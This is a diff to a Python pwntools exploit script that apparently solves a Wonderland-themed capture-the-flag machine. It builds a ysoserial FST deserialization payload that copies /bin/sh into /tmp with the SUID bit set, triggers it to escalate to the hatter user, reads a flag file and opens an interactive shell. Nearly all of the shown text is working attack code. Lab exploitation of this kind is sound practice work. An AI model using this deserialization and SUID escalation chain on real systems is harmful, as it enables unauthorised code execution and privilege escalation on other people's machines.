@@ -294,7 +294,7 @@ def main():
     # Generate the deserialization payload.
     log.info('Generating FST Deserialization payload to create a hatter SUID binary.')
     fst_payload = subprocess.check_output(
-        ['java', '-jar', 'ysoserial-fst-private-master/target/ysoserial-0.0.6-SNAPSHOT-all.jar',
+        ['java', '-jar', '/opt/wonderland/ysoserial-0.0.6-SNAPSHOT-all.jar',
          '-fst', 'CommonsBeanutils1',
          'bash -c {cp,/bin/sh,/tmp/hackers_use_me/pwn2};{chmod,+s,/tmp/hackers_use_me/pwn2}'],
         stderr=subprocess.DEVNULL
@@ -344,7 +344,8 @@ def main():
     # Send a test echo to check if we are back in the shell.
     # Wait a small moment.
     log.progress('Waiting a moment to return back to the shell context...')
-    time.sleep(4)
+    time.sleep(2)
+    c.sendline(b'\n\n')
 
     # Drop into the hatter suid shell.
     log.info('Triggering the SUID binary to escalate to the hatter user.')
@@ -356,9 +357,9 @@ def main():
     # Get the flag.
     log.info('Reading the flag at /home/hatter/flag4')
     log.success('Flag 4:')
-    c.sendline('cat /home/hatter/flag4')
-    c.sendline('echo END_OF_FLAG')
-    log.success(c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b''))
+    c.sendline('cat /home/hatter/flag4\n\n\n')
+    c.sendline('echo END_OF_FLAG\n\n\n')
+    log.success(c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b'').strip())
 
     # Drop into an interactive shell.
     log.success('Enjoy your shell!')
